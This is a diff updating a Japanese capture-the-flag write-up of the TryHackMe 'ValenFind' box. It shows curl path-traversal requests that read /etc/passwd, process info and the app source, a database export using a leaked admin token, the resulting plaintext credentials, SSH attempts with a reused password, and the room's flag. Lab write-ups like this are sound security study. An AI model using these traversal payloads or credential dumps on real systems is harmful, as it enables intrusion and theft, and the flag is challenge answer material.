@@ -2,9 +2,9 @@
 tags: [hacking, box, writeup]
 platform: TryHackMe
 difficulty: Unknown
-status: in-progress
+status: completed
 date: 2026-03-20
-ip: 10.48.130.17
+ip: 10.48.163.116
 skills:
   - web enumeration
   - LFI (Local File Inclusion)
@@ -16,7 +16,7 @@ skills:
 # ValenFind - Secure Dating
 
 **プラットフォーム**: TryHackMe
-**IP**: `10.48.130.17`
+**IP**: `10.48.163.116`
 **OS**: Linux (Ubuntu)
 
 ---
@@ -26,7 +26,7 @@ skills:
 ### ポートスキャン (RustScan + Nmap)
 
 ```bash
-rustscan -a 10.48.130.17 --ulimit 5000 -- -sC -sV
+rustscan -a 10.48.163.116 --ulimit 5000 -- -sC -sV
 ```
 
 **開いているポート:**
@@ -44,10 +44,20 @@ rustscan -a 10.48.130.17 --ulimit 5000 -- -sC -sV
 
 ### Webアプリ調査
 
-**URL**: `http://10.48.130.17:5000`
+**URL**: `http://10.48.163.116:5000`
 
 #### アカウント登録 / ログイン
 - テストアカウント作成成功: `testuser / password`
+
+```bash
+# ログインしてCookieを保存
+curl -c /tmp/cookies.txt -b /tmp/cookies.txt -L \
+  -X POST http://10.48.163.116:5000/login \
+  -d "username=testuser&password=password"
+
+# 以降のリクエストはCookieを付けて送る
+curl -b /tmp/cookies.txt http://10.48.163.116:5000/dashboard
+```
 
 #### ログイン後に発見したエンドポイント
 
@@ -99,7 +109,7 @@ function loadTheme(layoutName) {
 ### Step 2: パストラバーサルで `/etc/passwd` 取得
 
 ```bash
-curl -b cookies.txt "http://10.48.130.17:5000/api/fetch_layout?layout=../../../../etc/passwd"
+curl -b cookies.txt "http://10.48.163.116:5000/api/fetch_layout?layout=../../../../etc/passwd"
 ```
 
 **結果: 成功** `/etc/passwd` の内容が取得できた。
@@ -115,7 +125,7 @@ ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
 ### Step 3: プロセス情報からアプリの場所を特定
 
 ```bash
-curl -b cookies.txt "http://10.48.130.17:5000/api/fetch_layout?layout=../../../../proc/self/cmdline"
+curl -b cookies.txt "http://10.48.163.116:5000/api/fetch_layout?layout=../../../../proc/self/cmdline"
 # 結果: /usr/bin/python3 /opt/Valenfind/app.py
 ```
 
@@ -126,7 +136,7 @@ curl -b cookies.txt "http://10.48.130.17:5000/api/fetch_layout?layout=../../../.
 ### Step 4: ソースコード (app.py) を取得
 
 ```bash
-curl -b cookies.txt "http://10.48.130.17:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py"
+curl -b cookies.txt "http://10.48.163.116:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py"
 ```
 
 **結果: 成功** ソースコード全体を取得。
@@ -195,7 +205,7 @@ if 'seeder.py' in layout_file:
 ```bash
 curl -o cupid.db \
   -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
-  "http://10.48.130.17:5000/api/admin/export_db"
+  "http://10.48.163.116:5000/api/admin/export_db"
 
 sqlite3 cupid.db "SELECT id, username, password, real_name, email FROM users;"
 ```
@@ -211,18 +221,18 @@ sqlite3 cupid.db "SELECT id, username, password, real_name, email FROM users;"
 | 5 | gatsby_great | green_light | Jay Gatsby | jay@westegg.party |
 | 6 | jane_eyre | rochester_blind | Jane Eyre | jane@thornfield.book |
 | 7 | count_dracula | sunlight_sucks | Vlad Dracula | vlad@night.walker |
-| 8 | **cupid** | **admin_root_x99** | System Administrator | cupid@internal.cupid |
+| 8 | **cupid** | **admin_root_x99** | System Administrator | cupid@internal.cupid | address: `FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}` |
 | 9 | testuser | password | (自作アカウント) | |
 
 ### 次に試すSSHログイン (未実施)
 
 ```bash
 # cupid は管理者 → パスワード使い回しの可能性
-ssh cupid@10.48.130.17      # password: admin_root_x99
-ssh ubuntu@10.48.130.17     # password: admin_root_x99 (使い回し?)
+ssh cupid@10.48.163.116      # password: admin_root_x99
+ssh ubuntu@10.48.163.116     # password: admin_root_x99 (使い回し?)
 ```
 
-**ユーザーフラグ**: `user.txt` →
+**フラグ**: `THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`
 
 ---
 
